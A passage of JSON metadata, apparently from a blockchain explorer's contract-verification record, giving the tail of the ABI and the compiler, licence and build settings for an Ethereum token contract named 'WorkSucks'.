type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "WorkSucks", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://11e46c6fa0f1c2a98938c969c333e4a308a3a4c8a67a5a04122315bb57a41b7d"}